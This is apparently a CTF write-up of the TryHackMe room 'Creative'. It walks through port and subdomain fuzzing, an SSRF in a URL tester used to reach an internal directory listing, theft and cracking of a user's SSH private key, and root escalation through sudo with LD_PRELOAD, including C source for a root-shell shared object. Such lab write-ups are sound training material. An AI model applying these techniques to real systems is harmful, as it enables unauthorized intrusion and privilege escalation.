---
title: "Creative"
date: 2025-02-18
image: /assets/img/general/CTFgeneral_image.jpg
description: Writeup of the TryHackMe-CTF Creative
categories: [TryHackMe, Easy]
tags: [linux, web, privesc]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Creative</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Exploit a vulnerable web application and some misconfigurations to gain root privileges.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/creative">https://tryhackme.com/room/creative</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Creative.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.222.5               
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 12:54 EST
  Nmap scan report for 10.10.222.5
  Host is up (0.045s latency).
  Not shown: 65533 filtered tcp ports (no-response)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http

  Nmap done: 1 IP address (1 host up) scanned in 116.54 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80 10.10.222.5
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 12:57 EST
  Nmap scan report for 10.10.222.5
  Host is up (0.044s latency).

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)
  |   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)
  |_  256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)
  80/tcp open  http    nginx 1.18.0 (Ubuntu)
  |_http-title: Did not follow redirect to http://creative.thm
  |_http-server-header: nginx/1.18.0 (Ubuntu)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 11.71 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

When I accessed the webserver my browser got redirect to the dns name `creative.thm`. I added the name in my `hosts` file an proceed. Because of the hostname, I started with a subdomain enumeration:

```bash
 ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.creative.thm" -u http://10.10.222.5/ -fs 178

          /'___\  /'___\           /'___\       
         /\ \__/ /\ \__/  __  __  /\ \__/       
         \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
          \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
           \ \_\   \ \_\  \ \____/  \ \_\       
            \/_/    \/_/   \/___/    \/_/       

         v2.1.0-dev
  ________________________________________________

   :: Method           : GET
   :: URL              : http://10.10.222.5/
   :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
   :: Header           : Host: FUZZ.creative.thm
   :: Follow redirects : false
   :: Calibration      : false
   :: Timeout          : 10
   :: Threads          : 40
   :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
   :: Filter           : Response size: 178
  ________________________________________________

  beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 45ms]
```

I found a subdomain which showed an URL Tester:

![URL tester](/assets/img/tryhackme/Creative/thm_creative_1.jpg)

I started with the local website `http://127.0.0.1/` and the website got loaded. This seemed to be a Server-Side Request Forgery (SSRF) vulnerability, so I checked if I were able to reach another internal system on a different port. I used ffuf to fuzz localhost and all ports up to 65535. I created a port list using `seq` as the wordlist for ffuf.

```bash
$ seq 65535 > ports.txt
$ ffuf -w ports.txt -u http://beta.creative.thm/ -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "url=http://127.0.0.1:FUZZ" -fs 13

          /'___\  /'___\           /'___\       
         /\ \__/ /\ \__/  __  __  /\ \__/       
         \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
          \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
           \ \_\   \ \_\  \ \____/  \ \_\       
            \/_/    \/_/   \/___/    \/_/       

         v2.1.0-dev
  ________________________________________________

   :: Method           : POST
   :: URL              : http://beta.creative.thm/
   :: Wordlist         : FUZZ: /home/kali/ctf/creative/ports.txt
   :: Header           : Content-Type: application/x-www-form-urlencoded
   :: Data             : url=http://127.0.0.1:FUZZ
   :: Follow redirects : false
   :: Calibration      : false
   :: Timeout          : 10
   :: Threads          : 40
   :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
   :: Filter           : Response size: 13
  ________________________________________________

  80                      [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 80ms]
  1337                    [Status: 200, Size: 1143, Words: 40, Lines: 39, Duration: 78ms]
```

Ffuf identified an interesting port. I started checking the `1337` which revealed a directory listing from the server:

![Directory browsing](/assets/img/tryhackme/Creative/thm_creative_2.jpg)

Since I had some initial access to the system I enumerated the files and directories for gaining a better access. I found the `.bash_history` in the `/home/saad` directory. The user stored his credentials in a file:
```bash
[...]
sudo -l
echo "saad:[removed]" > creds.txt
rm creds.txt
[...]
```

I tried to use this to connect with SSH, but got an error because of my public key. I searched for `saad's` private key and found it under `/home/saad/.ssh/id_rsa`. After downloading the key I stored it in a file called `id_rsa`. For the SSH connection I needed the password for the key. I used `ssh2john` to retrieve the key hash and stored it in a file. With john and the rockyou.txt wordlist, I was able to crack the password. After that I was able to login with SSH and retrieved the user flag:
```bash
$ nano id_rsa
$ ssh2john id_rsa > hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
  Using default input encoding: UTF-8
  Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
  Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
  Cost 2 (iteration count) is 16 for all loaded hashes
  Will run 8 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  [removed]        (id_rsa)     
  1g 0:00:00:10 DONE (2025-02-18 04:23) 0.09124g/s 87.59p/s 87.59c/s 87.59C/s hawaii..sandy
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed. 
$ chmod 600 id_rsa
$ ssh -i id_rsa saad@10.10.246.214

saad@m4lware:~$ cat user.txt
  [removed]
```

## Privilege Escalation root
I started with `sudo -l` because I already found the password and got the following output:
```bash
$ sudo -l
  [sudo] password for saad: 
  Matching Defaults entries for saad on m4lware:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

  User saad may run the following commands on m4lware:
      (root) /usr/bin/ping
```

The tool `ping` itself won't help that much on its own, but in combination with `env_keep+=LD_PRELOAD` it did. First I created a file called shell.c with the following content:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
```

Then I compiled it as a shared object using `gcc`:
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

I was able to specify the `LD_PRELOAD` to point to my shared object, started a ping using `sudo` and became root. From there I was able to retrieve the root flag:
```bash
$ sudo LD_PRELOAD=/home/saad/shell.so /usr/bin/ping
root@m4lware:/home/saad# cd /root
root@m4lware:~# cat root.txt 
  [removed]
```

solved! :)